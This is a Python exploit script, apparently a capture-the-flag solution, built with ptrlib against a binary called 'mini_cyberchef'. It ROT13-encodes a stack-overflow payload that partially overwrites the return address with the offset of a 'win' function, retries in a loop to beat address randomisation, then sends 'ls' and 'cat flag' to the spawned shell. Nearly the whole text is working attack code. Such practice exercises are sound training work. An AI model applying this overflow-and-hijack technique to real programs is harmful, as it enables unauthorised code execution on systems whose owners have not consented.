from ptrlib import *
import codecs

elf = ELF('./mini_cyberchef')


def rot13(payload, enc=True):
    if (enc):
        payload = codecs.encode(payload.decode(), 'rot-13')
    io.sendlineafter("> ", '3')
    io.sendlineafter("> ", payload)
    io.recvuntil(": ")
    first = io.recvuntil("\nRestore\n")[:-10]
    #io.recvuntil(": ")
    return first
while(1):
    try:
        io = Process('./mini_cyberchef')
        #io = remote('localhost', 30005)
        #input("> ")
        win_offset = elf.symbol('win')
        payload = b"A" * (0x100-8) + p16(win_offset)
        first = rot13(payload)
        io.sendline("ls")
        io.sendlineafter("flag", "cat flag", timeout=0.1)
        io.sendlineafter("flag", "cat flag")
        print(io.recvline())
        break
    except TimeoutError as e:
        io.close()
        print(e)

io.interactive()
